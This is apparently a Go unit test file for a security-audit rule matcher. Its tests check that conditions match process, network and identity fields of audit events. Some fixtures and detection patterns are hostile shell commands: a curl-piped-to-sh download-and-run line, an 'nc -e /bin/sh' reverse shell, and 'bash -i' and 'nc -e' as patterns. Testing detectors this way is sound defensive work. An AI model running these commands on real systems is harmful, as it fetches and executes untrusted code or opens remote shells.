package rule

import (
	"testing"

	"diting/backend/internal/audit"
)

func TestMatcherContainsCmdline(t *testing.T) {
	event := audit.Event{Cmdline: "bash -c 'curl example.com | sh'"}
	expr := Expression{
		Operator: "and",
		Conditions: []Condition{
			{Field: "cmdline", Op: "contains", Value: "curl"},
		},
	}

	if !Match(expr, event) {
		t.Fatal("expected cmdline contains rule to match")
	}
}

func TestMatcherEqEventType(t *testing.T) {
	event := audit.Event{EventType: "process_exec"}
	expr := Expression{
		Operator: "and",
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec"},
		},
	}

	if !Match(expr, event) {
		t.Fatal("expected event_type eq rule to match")
	}
}

func TestMatcherOrReturnsTrueWhenOneConditionMatches(t *testing.T) {
	event := audit.Event{Cmdline: "nc -e /bin/sh"}
	expr := Expression{
		Operator: "or",
		Conditions: []Condition{
			{Field: "cmdline", Op: "contains", Value: "bash -i"},
			{Field: "cmdline", Op: "contains", Value: "nc -e"},
		},
	}

	if !Match(expr, event) {
		t.Fatal("expected or expression to match when one condition matches")
	}
}

func TestMatcherAndReturnsFalseWhenOneConditionFails(t *testing.T) {
	event := audit.Event{EventType: "process_exec", Cmdline: "id"}
	expr := Expression{
		Operator: "and",
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "process_exec"},
			{Field: "cmdline", Op: "contains", Value: "bash -i"},
		},
	}

	if Match(expr, event) {
		t.Fatal("expected and expression to fail when one condition fails")
	}
}

func TestMatcherNetworkFields(t *testing.T) {
	event := audit.Event{
		EventType: "network_connect",
		DstIP:     "110.242.68.4",
		DstPort:   443,
		Protocol:  "tcp",
	}
	expr := Expression{
		Operator: "and",
		Conditions: []Condition{
			{Field: "event_type", Op: "eq", Value: "network_connect"},
			{Field: "dst_ip", Op: "eq", Value: "110.242.68.4"},
			{Field: "dst_port", Op: "eq", Value: "443"},
			{Field: "protocol", Op: "eq", Value: "tcp"},
		},
	}

	if !Match(expr, event) {
		t.Fatal("expected network fields rule to match")
	}
}

func TestMatcherAuditIdentityFields(t *testing.T) {
	event := audit.Event{
		HostID:        "host-001",
		NodeName:      "node-1",
		LoginUsername: "ubuntu",
		Username:      "root",
	}
	expr := Expression{
		Operator: "and",
		Conditions: []Condition{
			{Field: "host_id", Op: "eq", Value: "host-001"},
			{Field: "node_name", Op: "eq", Value: "node-1"},
			{Field: "login_username", Op: "eq", Value: "ubuntu"},
		},
	}

	if !Match(expr, event) {
		t.Fatal("expected audit identity fields rule to match")
	}
}
